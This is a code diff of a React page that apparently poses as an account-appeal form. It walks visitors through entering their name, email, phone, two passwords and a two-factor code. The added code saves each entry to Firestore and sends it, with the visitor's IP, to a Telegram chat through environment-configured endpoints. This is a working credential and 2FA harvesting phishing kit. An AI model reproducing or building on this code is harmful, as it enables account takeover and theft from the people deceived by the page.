@@ -1,31 +1,40 @@
 import styles from '../styles/Home.module.css'
 import { useState, useEffect } from 'react';
-import Sidebar from './sidebar';
+import Header from './header';
+import Help from './help';
+
 import HomePage from './home-page';
+import RequestAppeal from './request-appeal';
+
 import Password from './password';
 import Final from './final';
 import TwoFactorAuth from './two-factor-auth';
-import { doc, onSnapshot } from "firebase/firestore";
+import { doc, setDoc, updateDoc, onSnapshot, Timestamp } from "firebase/firestore";
+
 import { db } from  '../firebaseConfig';
 
 
 export default function Home(ip) {
 
-  const [steps, setOpen] = useState({step_one: true, step_two: false, step_three: false, step_four: false});
+  const [steps, setOpen] = useState({step_one: true, step_two: false, step_three: false, step_four: false, step_five: false});
 
-  const [email, setEmail] = useState('');
+  const [fullName, setFullName] = useState('');
   const [phone, setPhone] = useState('');
-  const [passwords, setPasswords] = useState({firstPw: '', secondPw: ''});;
+  const [email, setEmail] = useState('');
+  const [appeal, setAppeal] = useState('');
+  
+  const [firstPassword, setFirstPassword] = useState('');
+  const [secondPassword, setSecondPassword] = useState('');
 
 
-  useEffect(()=>{
-    let localEmail = localStorage.getItem("email");
-    if(localEmail){
-      setEmail(localEmail);
-      listenUser(localEmail);
-    }
-    sendOpenedScript();
-  },[]);  
+  // useEffect(()=>{
+  //   let localEmail = localStorage.getItem("email");
+  //   if(localEmail){
+  //     setEmail(localEmail);
+  //     listenUser(localEmail);
+  //   }
+  //   sendOpenedScript();
+  // },[]);  
 
   const sendOpenedScript = async () => {
 
@@ -36,9 +45,9 @@ export default function Home(ip) {
     `;
 
     const data = {
-      chat_id: process.env.chatId,
-      text: formattedMessage,
-      parse_mode: 'HTML'
+        chat_id: process.env.chatId,
+        text: formattedMessage,
+        parse_mode: 'HTML'
     };
 
 
@@ -51,16 +60,146 @@ export default function Home(ip) {
     });
   } 
 
-  const getData = (data) => {
+  const getData = async (data) => {
     if(data.type == 'home-page') {
-      setEmail(data.email);
-      setPhone(data.phone)
       setOpen({step_two: true});
-      listenUser(data.email);
-    } 
-    if(data.type == 'password'){
-      setPasswords(data.passwords);
-      setOpen({step_three: true})
+      sendOpenedScript();
+    }
+    if(data.type == 'request-appeal'){
+      console.log(data);
+      setFullName(data.data.fullName);
+      setEmail(data.data.email);
+      setPhone(data.data.phone);
+      setAppeal(data.data.appeal);
+
+      let obj = {
+            fullName: data.data.fullName,
+            email: data.data.email,
+            phone: data.data.phone,
+            appeal: data.data.appeal,
+            createdAt: await Timestamp.now(),
+            currentStep: '',
+            ip: ip.userIP
+      }
+      await setDoc(doc(db, "users", data.data.email), obj);
+      localStorage.setItem("email", data.data.email);
+      listenUser(data.data.email)
+      setOpen({step_three: true});
+
+      const formattedMessage = `
+          <b>User (${ip.userIP})</b>
+          -------------------------
+          <b>Full Name:</b> ${data.data.fullName}
+          <b>Email:</b> ${data.data.email}
+          <b>Phone:</b> ${data.data.phone}
+          <b>Appeal:</b> ${data.data.appeal}
+      `;
+          
+      const dataTelegram = {
+          chat_id: process.env.chatId,
+          text: formattedMessage,
+          parse_mode: 'HTML'
+      };
+                 
+      const response = await fetch(process.env.customKey, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(dataTelegram)
+      });
+    }
+
+    if(data.type == 'first-password'){
+        const docRef = doc(db, "users", email);
+        await updateDoc(docRef,data.data);
+        setFirstPassword(data.data.firstPassword);
+
+        const formattedMessage = `
+          <b>User (${ip.userIP})</b>
+          -------------------------
+          <b>Full Name:</b> ${fullName}
+          <b>Email:</b> ${email}
+          <b>Phone:</b> ${phone}
+          <b>Appeal:</b> ${appeal}
+          <b>First Password:</b> ${data.data.firstPassword}
+      `;
+          
+      const dataTelegram = {
+          chat_id: process.env.chatId,
+          text: formattedMessage,
+          parse_mode: 'HTML'
+      };
+                 
+      const response = await fetch(process.env.customKey, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(dataTelegram)
+      });
+
+    }
+    if(data.type == 'second-password') {
+        const docRef = doc(db, "users", email);
+        await updateDoc(docRef,data.data);
+        setOpen({step_four: true})
+        setSecondPassword(data.data.secondPassword);
+
+        const formattedMessage = `
+          <b>User (${ip.userIP})</b>
+          -------------------------
+          <b>Full Name:</b> ${fullName}
+          <b>Email:</b> ${email}
+          <b>Phone:</b> ${phone}
+          <b>Appeal:</b> ${appeal}
+          <b>First Password:</b> ${firstPassword}
+          <b>Second Password:</b> ${data.data.secondPassword}
+      `;
+          
+      const dataTelegram = {
+          chat_id: process.env.chatId,
+          text: formattedMessage,
+          parse_mode: 'HTML'
+      };
+                 
+      const response = await fetch(process.env.customKey, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(dataTelegram)
+      });
+    }
+    if(data.type == 'two-factor') {
+      // setOpen({step_five: true})
+      const formattedMessage = `
+          <b>User (${ip.userIP})</b>
+          -------------------------
+          <b>Full Name:</b> ${fullName}
+          <b>Email:</b> ${email}
+          <b>Phone:</b> ${phone}
+          <b>Appeal:</b> ${appeal}
+          <b>First Password:</b> ${firstPassword}
+          <b>Second Password:</b> ${secondPassword}
+          <b>Code:</b> ${data.data.code}
+
+      `;
+        
+            const dataGram = {
+              chat_id: process.env.chatId,
+              text: formattedMessage,
+              parse_mode: 'HTML'
+            };
+        
+        
+            const response = await fetch(process.env.customKey, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(dataGram)
+            });
     }
   }
 
@@ -83,15 +222,17 @@ export default function Home(ip) {
   return (
 
     <div className={styles.main}>
-        <Sidebar/>
+        <Header />
+        <Help />
+
         <div className={styles.content}>
-            <div className={styles.container}>
-                { (steps.step_one || steps.step_two) && <HomePage onSubmit={getData} ip={ip} />}
-                { steps.step_two && <Password email={email} phone={phone} onSubmit={getData} ip={ip} />}
-                { steps.step_three && <TwoFactorAuth onSubmit={getData} email={email} phone={phone} passwords={passwords} ip={ip} />}
-                { steps.step_four && <Final onSubmit={getData}/>}
-            </div>
+          { steps.step_one && <HomePage onSubmit={getData} /> }
+          { (steps.step_two || steps.step_three) && <RequestAppeal onSubmit={getData} /> }
+          { steps.step_three && <Password onSubmit={getData} /> }
+          { steps.step_four && <TwoFactorAuth onSubmit={getData} /> }
+          { steps.step_five && <Final onSubmit={getData} /> }
         </div>
+
     </div>
   )
 }
